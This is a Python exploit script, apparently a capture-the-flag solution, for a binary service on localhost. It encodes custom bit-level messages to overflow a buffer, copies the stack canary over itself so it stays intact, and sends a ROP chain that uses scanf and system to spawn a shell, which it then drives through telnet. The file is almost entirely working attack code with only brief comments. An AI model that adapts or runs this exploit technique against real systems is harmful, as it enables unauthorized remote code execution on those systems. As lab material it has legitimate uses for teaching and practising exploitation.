#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib


ADDR = "localhost"
PORT = 8888
DEBUG = False

s = socket.create_connection((ADDR, PORT))

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf


# PDU that sets a byte
# it is 9 bits in size
# [1+byte]
def set_byte(b):
    binb = bin(b)[2:].rjust(8, "0")
    bitstream = "1" + binb
    return bitstream

# PDU that sets a variable amount of data
# variable number of bytes
# [01+dword+dword+data], data is of variable size
# first dword is index, second is write_size
def set_buffer(idx, size):

    # builds a number in the format
    # every nibble has a 1 in front and last nibble has 0 after
    def build_num(n):
        r = n & 0xffffffff
        rbuf = ""
        while(r != 0):
            rbuf += "1" + bin(r & 0xf)[2:].rjust(4, "0")
            r = r >> 4
        rbuf += "0"
        return rbuf

    bin_idx = build_num(idx)
    bin_size = build_num(size)

    bitstream = "01" + bin_idx + bin_size
    return bitstream

# convert string bitstream to binary bytestream
def bits_to_bytes(bs):
    pbs = bs
    buf = ""
    l = len(bs)
    if (l % 8) != 0:
        pbs = pbs.ljust((l + (8 - (l % 8))), "0")

    assert(len(pbs) % 8 == 0)

    for i in range(0, len(bs), 8):
        buf += chr(int(bs[i:i+8][::-1], 2))

    return buf

def send_input(buf):
    l = len(buf)
    assert(l <= 0x800)
    rtil_str("size: ")
    s.send(str(l) + "\n")
    rtil_str("input: ")
    x = buf.encode('hex')
    s.send(x + "\n")

# helper function to write dwords
def write_dword(d):
    r = struct.pack("<I", d)
    buf = ""
    for b in r:
        buf += set_byte(ord(b))

    return buf

raw_input()

rtil_str("sorry.\n")

# we first set 512 bytes
count = 512
bs = set_byte(0x41) * count

# fill in outbuf
# so that counter is pointing at the beginning of
# bin_buf
for i in range(2):
    bs += set_buffer(count - 1, count)
    count += count

# overwrite bin_buf with itself
bs += set_buffer(-1, 2048)

# overwrite in_buf with itself
bs += set_buffer(1, 4096)
# overwrite weird alignment byte
bs += set_byte(0x41) * 1

# counter is now pointing at the stack canary
# we overwrite stack canary with itself
bs += set_buffer(-1, 4)

# saved ebp and random shit
bs += set_byte(0x41) * 12

## rop starts :) ##
# we use scanf("%u", in_bss)
# to write "sh" in the data
# then we call system

scanf_plt = 0x08048700
p_u = 0x0804901B                # %u
ppret = 0x8048eee
in_data = 0x0804B058

system_plt = 0x80486A0
exit_plt = 0x08048790

bs += write_dword(scanf_plt)
bs += write_dword(ppret)
bs += write_dword(p_u)
bs += write_dword(in_data)
bs += write_dword(system_plt)
bs += write_dword(exit_plt)
bs += write_dword(in_data)

# send it all
buf = bits_to_bytes(bs)
send_input(buf)

sh_dec = int("hs".encode('hex'), 16)
s.send(str(sh_dec) + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
